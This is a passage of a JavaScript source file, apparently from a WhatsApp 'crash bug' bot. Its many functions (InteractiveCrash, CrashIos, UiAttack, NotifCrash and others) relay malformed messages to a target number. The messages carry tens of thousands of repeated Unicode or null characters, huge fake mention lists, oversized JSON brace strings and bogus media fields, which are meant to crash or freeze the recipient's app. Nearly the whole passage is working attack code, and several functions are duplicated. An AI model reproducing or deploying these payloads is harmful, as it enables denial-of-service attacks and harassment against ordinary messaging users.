            callLogMesssage: {
              isVideo: true,
              callOutcome: 0,
              durationSecs: "9999",
              callType: "VIDEO",
              participants: [{ jid: target, callOutcome: 1 }]
            }
          }
        }
      }
    }, {});

    await sock.sendMessage(target, {
      text: textSpam,
      contextInfo: { mentionedJid: mentionSpam }
    }, { quoted: null });

    await sock.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 9999,
                degreesLongitude: 9999
              },
              hasMediaAttachment: true
            },
            body: { text: invisibleChar },
            nativeFlowMessage: {},
            contextInfo: { mentionedJid: randomMentions }
          },
          groupStatusMentionMessage: {
            groupJid: target,
            mentionedJid: randomMentions,
            contextInfo: { mentionedJid: randomMentions }
          }
        }
      }
    }, {
      participant: { jid: target },
      messageId: undefined
    });

    const contacts = Array.from({ length: contactAmount }, () => ({
      displayName: `${contactName + triggerChar}`,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${contactName};;;\nFN:${contactName}\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
    }));

    await sock.relayMessage(target, {
      contactsArrayMessage: {
        displayName: `${contactName + triggerChar}`,
        contacts,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          quotedAd: {
            advertiserName: "x",
            mediaType: "IMAGE",
            jpegThumbnail: "" 
          }
        }
      }
    }, {});

    const payloadDelay1 = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            mimetype: "image/jpeg",
            caption: "",
            fileLength: "9999999999999",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
            height: 1,
            width: 1,
            jpegThumbnail: Buffer.from("").toString("base64"),
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          },
          interactiveMessage: {
            header: {
              title: " ".repeat(7000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "⟅ ༑ ▾𝗣𝗛𝗢𝗘𝗡𝗜𝗫 •𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦⟅ ༑ ▾" },
            footer: { text: "🩸 ༑ 𝗣𝗛𝗢𝗘𝗡𝗜𝗫 炎 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒⟅ ༑ 🩸" },
            nativeFlowMessage: { messageParamsJson: corruptedJson },
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", payloadDelay1, {
      messageId: null,
      statusJidList: [target]
    });

    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣",
              imageMessage: {
                    url: "https://Wa.me/stickerpack/D7eppeli",
                mimetype: "image/jpeg",
                caption: "{ null ) } Sigma \u0000 Bokep 100030 caption: bokep",
                height: 819,
                width: 1792,
                jpegThumbnail: Buffer.from("").toString("base64"),
                mediaKey: "WedxqVzBgUBbL09L7VUT52ILfzMdRnJsjUPL0OuLUmQ=",
                mediaKeyTimestamp: "1752001602"
              },
              hasMediaAttachment: true
            },
            body: { text: "🩸⃟ ༚ Syahril Imut𝒔⃰ͯཀ͜͡🦠-‣" },
            nativeFlowMessage: {
              buttons: [
                { name: "galaxy_message", buttonParamsJson: "[".repeat(29999) },
                { name: "galaxy_message", buttonParamsJson: "{".repeat(38888) }
              ],
              messageParamsJson: "{".repeat(10000)
            },
            contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA" }
          }
        }
      }
    }, {});

    console.log("Succes Send to target!");

  } catch (err) {
    console.error("❌ Error in function bug axgankBug:", err);
  }
}
async function InvisibleInfinite(target) {
try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "deafort",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "GetsuzoCompany",
                address: "GetSuzo",
              },
            },
            body: {
              text: "~ Getsuzo",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: targetNumber,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await sock.relayMessage(targetNumber, message, {
      messageId: null,
      participant: { jid: targetNumber },
      userJid: targetNumber,
    });
  } catch (err) {
    console.log(err);
  }
}

async function StXFc(target) {
  const baten = [
    { name: "single_select", buttonParamsJson: "" }
  ];

  for (let i = 0; i < 10; i++) {
    baten.push(
      { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
      { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
    );
  }

  const stxview = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
      contextInfo: {
        participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
        remoteJid: "target",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
      }
    },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  imageMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "9999999999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
  },
                },
                body: { text: "😂" + "\u0000".repeat(5000) },
                nativeFlowMessage: {
                  buttons: baten,
                  messageParamsJson: "{".repeat(10000)
                }
              }
            ]
          }
        }
      }
    }
  };
  
    await sock.relayMessage(target, stxview, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    }),
    await sock.relayMessage(target, stxview, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    });
}
async function InteractiveCrash(target) {
  try {
    const Msg = await generateWAMessageFromContent(
      target,
      {
        message: {
          interactiveMessage: {
            text: "GetsuzoCompany",
            format: "DEFAULT"
          },
          nativeFlowMessage: {
            name: "menu_option",
            paramsJson: "{{{".repeat(9999) + "\u0007\u0007".repeat(25555) + "".repeat(2555)
          },
          contextInfo: {
            stanzaId: "Laurine-BD32C2474B38",
            participant: target,
            annotations: [
              {
                polygonVertices: Array.from({ length: 10000 }, () => ({
                  x: Math.random() * 999999,
                  y: Math.random() * 999999
                })),
                newsletter: {
                  newsletterJid: "120363301416835342@newsletter",
                  newsletterName: "Erlangga Official Kill You !!!",
                  contentType: "UPDATE",
                  accessibilityText: "\u0000".repeat(10000)
                }
              }
            ],
            quotedMessage: {
              buttonMessage: {
                text: "ꦾ".repeat(25555),
                imageMessage: {
                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQN-fek5BOzwGwVNT4XLvpKbOIreTVEAYw8T6P4zxhZZWR0mcI6Mtkvr0wPAw8dRRfBUshZEfRtyuPzDlvHu_tKklNofdgOHkgQy3k2_4w?ccb=9-4&oh=01_Q5Aa2AERSLJi1hc8wlnqazVb2gIWRJgAhnioW7jEj-1yYDLXGA&oe=68A8518F&_nc_sid=e6ed6c&mms3=true",
                  mimetype: "image/jpeg",
                  caption: "\u0000\u0000".repeat(20000),
                  fileSha256: "lkP8hsY4ex+lzJw1ylVMCT/Ofl2Ouk7vTzjwKliA5fI=",
                  fileLength: 73247,
                  height: 736,
                  width: 736,
                  mediaKey: "X+ED0aJJfYyCud4vJNgwUUdMQy1zMJ7hHAsFUIUgt1w=",
                  fileEncSha256: "5xn7hRt0IR3v3pc54sbg8bemzYbE3FTHoK4rbWWE4Jk=",
                  directPath: "/o1/v/t24/f2/m238/AQN-fek5BOzwGwVNT4XLvpKbOIreTVEAYw8T6P4zxhZZWR0mcI6Mtkvr0wPAw8dRRfBUshZEfRtyuPzDlvHu_tKklNofdgOHkgQy3k2_4w?ccb=9-4&oh=01_Q5Aa2AERSLJi1hc8wlnqazVb2gIWRJgAhnioW7jEj-1yYDLXGA&oe=68A8518F&_nc_sid=e6ed6c",
                  jpegThumbnail: null
                },
                mentionedJid: [
                  target,
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ]
              }
            }
          }
        }
      }
    );

    await sock.relayMessage(target, Msg.message, {
      messageId: undefined
    });

    await delay(3000);

    await sock.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: Msg.key?.id,
        participant: target
      }
    });

  } catch (err) {
    console.error('❌ Gagal menjalankan InteractiveCrash:', err);
  }
}

async function Dellay1(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "Dellay",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Traz Invictus" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function CrashIos(target) {
   try {
      let locationMessage = {
         degreesLatitude: -199.99999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "Hidup Jokowi!!!" + "𑆿".repeat(50000),
         address: "Hidup Jokowi!!!" + "𑆿".repeat(40000),
         url: `https://Wa.me/stickerpack/D.${"𑇂𑆵𑆴𑆿".repeat(40000)}`
      };
      let Lonte = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: { locationMessage }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "Getsuzo!!!",
            matchedText: "Getsuzo!!!",
            description: "Getsuzo!!!".repeat(50000),
            title: "GetsuzoCompany" + "https://Wa.me/stickerpack/D7eppeli".repeat(25000),
            previewType: "NONE",
            jpegThumbnail: "https://Wa.me/stickerpack/D7eppeli"
         }
      };
      let WiWokDetok = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: extendMsg
         }
      }, {});
      await sock.relayMessage('status@broadcast', Lonte.message, {
         messageId: Lonte.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: { jid: target },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', WiWokDetok.message, {
         messageId: WiWokDetok.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: { jid: target },
                  content: undefined
               }]
            }]
         }]
      });
      
   console.log(chalk.red.bold("Getsuzo Sending...."));
      
   } catch (err) {
      console.error(err);
   }
};

async function XheavensdeeP(target) {
  // deklarasi dulu di luar object
  let title = "𑇂𑆵𑆴𑇂𑆵𑆴𑇂𑆵𑆴\n\nhttps://Wa.me/stickerpack/D7eppeli".repeat(90000);
  let message = {
    body: "Getsuzo"
  };

  await sock.relayMessage(target, {
    extendedTextMessage: {
      text: "GetsuzoCompany\n\n𑇂𑆵𑆴𑇂𑆵𑆴𑇂𑆵𑆴𑇂𑆵𑆴𑇂𑆵𑆴" + "\u0000".repeat(990000) + "https://Wa.me/stickerpack/D7eppeli",
      matchedText: "https://Wa.me/stickerpack/D7eppeli",
      description: title,   // pakai variabel, bukan bikin ulang
      title: title,         // pakai variabel juga
      previewType: "NONE",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
      inviteLinkGroupTypeV2: "DEFAULT", 
      contextInfo: {
        externalAdReply: {
          renderLargerThumbnail: true,
          thumbnailUrl: "https://Wa.me/stickerpack/D7eppeli",
          sourceUrl: "https://Wa.me/stickerpack/d7y",
          showAdAttribution: true,
          body: "GetsuzoCompany",
          title: "I\'ll Never Let U Go Again...\n-( 7-Ydz )"
        }, 
        isForwarded: true,
        forwardingScore: 999,
        forwardedNewsletterMessageInfo: {
          newsletterName: "GetsuzoCompany",
          newsletterJid: "13135550002@newsletter",
          serverId: 1
        }
      }
    }
  }, { participant: { jid: target } });
}


async function Dellay4(target) {
  let message = {
      viewOnceMessage: {
      message: {
      stickerMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
          low: 1746112211,
          high: 0,
          unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
          mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
          {
          length: 40000,
          },
          () =>
          "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function NotifCrash(target, ptcp = true) {
         let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝘠𝘰𝘬𝘰𝘴𝘰..",
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "GetsuzoCompany" + "ꦽ".repeat(10000) + "ꦾ".repeat(10000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "call_permission_request",
                                        buttonParamsJson: "\u0003"
                                    },
                                    {
                                        name: "single_select",
                                        buttonParamsJson: "\u0003"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await sock.relayMessage(target, msg.message, ptcp ? {
participant: {
jid: target
}
} : {});
            console.log(chalk.red("Success Sending Bug"));
        }

async function ZieeInvisForceIOS(sock, target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "Z1ee - Tryhards ¿?" + "\u0000".repeat(70000) + "𑇂𑆵𑆴𑆿".repeat(60000),
        url: "https://github.com/urz1ee",
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
              caption: "@Urz1ee" + "𑇂𑆵𑆴𑆿".repeat(70000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id || Math.random().toString(36).slice(2),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
}
async function UiAttack(target) {
  try {
    let buttonsFreze = [];

    buttonsFreze.push({
      name: "single_select",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    });

    for (let i = 0; i < 200; i++) {
      buttonsFreze.push({
        name: "cta_catalog",
        buttonParamsJson: JSON.stringify({
          status: true,
        }),
      });
    }
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text:
                "Getsuzo Company" +
                "ꦽ".repeat(50000) +
                "ꦾ".repeat(20000),
            },
            nativeFlowMessage: {
              buttons: buttonsFreze,
              messageParamsJson: "{{".repeat(20000),
            },
            messageVersion: 1,
          },
        },
      },
    };

    const pertama = await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });

    const kedua = await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });
  } catch (error) {
    console.error("Terdapat Eror Pada Bagian Struktur Function", error);
  }
}

async function GetsuzoCompany(target) {
  await sock.relayMessage(
    target, // target kirim pesan, misal: "status@broadcast"
    {
      extendedTextMessage: {
        text: "\u2060".repeat(90000) +
              "\n\nhttps://Wa.me/stickerpack/D7eppeli\n\n" +
              "\u2060".repeat(90000),
        title: "https://Wa.me/stickerpack/D7eppeli" + "\u0000".repeat(90000),
        description: "GetsuzoZhiro" + "\u2060" + "\u0000".repeat(90000),
        previewType: "NONE",
        jpegThumbnail: "https://files.catbox.moe/c33quj.jpg" + "\u0000".repeat(50000) + "https://Wa.me/stickerpack/D7eppeli".repeat(90000),
        contextInfo: {
          externalAdReply: {
            renderLargerThumbnail: true,
            showAdAttribution: true,
            body: "GetsuzoCompany",
            title: "Getsuzo" + "ི꒦ྀ".repeat(90000),
          },
          isForwarded: true,
          forwardingScore: 999
        }
      }
    },
    { participant: { jid: target } }
  )
}




async function uiKiller(target) {
  await sock.relayMessage(target, 
    {
      locationMessage: {
        degreesLongitude: 0,
        degreesLatitude: 0,
        name: "GetsuzoCompany" + "ི꒦ྀ".repeat(9000), 
        url: "https://Amelia." +  "ི꒦ྀ".repeat(9000) + ".id", 
        address:  "GetsuzoCompany" + "ི꒦ྀ".repeat(9000), 
        contextInfo: {
          externalAdReply: {
            renderLargerThumbnail: true, 
            showAdAttribution: true, 
            body:  "GetsuzoCompany", 
            title: "ི꒦ྀ".repeat(9000), 
            sourceUrl: "https://Amelia." +  "ི꒦ྀ".repeat(9000) + ".id",  
            thumbnailUrl: null, 
            quotedAd: {
              advertiserName: "ི꒦ྀ".repeat(10000), 
              mediaType: 2,
              jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", 
              caption: "-( AMA )-", 
            }, 
            pleaceKeyHolder: {
              remoteJid: "0@s.whatsapp.net", 
              fromMe: false, 
              id: "ABCD1234567"
            }
          }
        }
      }
    }, 
  {});
}

async function Am(target) {  
  let msg = {
    stickerMessage: {
        url: "https://Wa.me/stickerpack/D7eppeli",
        fileSha256: "61bGpsFlkhDNSzP7iGpkZ4g8/lNG0IYYKSusMs5I5Uc=",
        fileEncSha256: "UdjQrI89kosNE4zZGPfqPSTxAohlIlTW0dfGTAz5ikk=",
        mediaKey: "up/4gSlgR/uhHeGcgd9fdRtUMjfbPMNCbfxbINXlQgU=",
        mimetype: "application/was",
        height: 9999,
        width: 9999,
        directPath: "/v/t62.15575-24/531394224_1769273720396834_917219850068298254_n.enc?ccb=11-4&oh=01_Q5Aa2QG9sgfqFiPkXpIE9ii0iUKgTKpWb3-4hfJ2O13OYemXrw&oe=68C69453&_nc_sid=5e03e0",
        fileLength: "999999999999999999",
        mediaKeyTimestamp: "1755253587",
        isAnimated: true,
        stickerSentTs: "1755253587205",
        isAvatar: false,
        isAiSticker: false,
        isLottie: true,        
      contextInfo: {
        participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 9999 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
        remoteJid: "target",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    },
  };
  
  await sock.relayMessage(target, msg, {
    participant: { jid:target }, 
    messageId: null
  });
}


async function ZieeInvisForceIOS(sock, target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "Z1ee - Tryhards ¿?" + "\u0000".repeat(70000) + "𑇂𑆵𑆴𑆿".repeat(60000),
        url: "https://github.com/urz1ee",
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
              caption: "@Urz1ee" + "𑇂𑆵𑆴𑆿".repeat(70000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id || Math.random().toString(36).slice(2),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
}

async function ZieeInvisForceIOS(target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "Z1ee - Tryhards ¿?" + "\u0000".repeat(70000) + "𑇂𑆵𑆴𑆿".repeat(60000),
        url: "https://github.com/urz1ee",
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
              caption: "@Urz1ee" + "𑇂𑆵𑆴𑆿".repeat(70000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id || Math.random().toString(36).slice(2),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
}

async function forceClick(target) {
  const buttonsList = [
    { type: "single_select", params: "" }
  ];

  for (let i = 0; i < 10; i++) {
    buttonsList.push(
      { type: "call_button", params: JSON.stringify({ status: true }) },
      { type: "copy_button", params: JSON.stringify({ display_text: "ꦽ".repeat(15000) }) },
      { type: "quick_reply", params: JSON.stringify({ display_text: "ꦽ".repeat(15000) }) }
    );
  }

  const messageData = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () => `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
            ]
          },
          remoteJid: target,
          participant: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
          stanzaId: "123",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
            forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
              creatorName: "Bot"
            }
          }
        },
        carouselMessage: {
          messageVersion: 1,
          cards: [
            {
              header: {
                hasMediaAttachment: true,
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc",
                  mimetype: "image/jpeg",
                  fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                  fileLength: "9999999999999",
                  height: 9999,
                  width: 9999,
                  mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                  fileEncSha256: "D0LtargetIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                  directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc"
                }
              },
              body: { text: "\n" + "\u0000".repeat(5000) },
              nativeFlowMessage: {
                buttons: buttonsList,
                messageParamsJson: "{".repeat(10000)
              }
            }
          ]
        }
      }
    }
  };

  await sock.relayMessage(target, messageData, { messageId: null, participant: { jid: target }, userJid: target });
  await sock.relayMessage(target, messageData, { messageId: null, participant: { jid: target }, userJid: target });
}


async function XheavensdeeP(target) {
  await sock.relayMessage(target, {
    extendedTextMessage: {
      text: "GetSuzo Company" + "ꦾ".repeat(10000) + "https://Wa.me/stickerpack/D7eppeli",
      matchedText: "https://Wa.me/stickerpack/D7eppeli",
      description: "\u74A7".repeat(65000),
      title: "GetsuzoCompany",
      previewType: "NONE",
      jpegThumbnail: "",
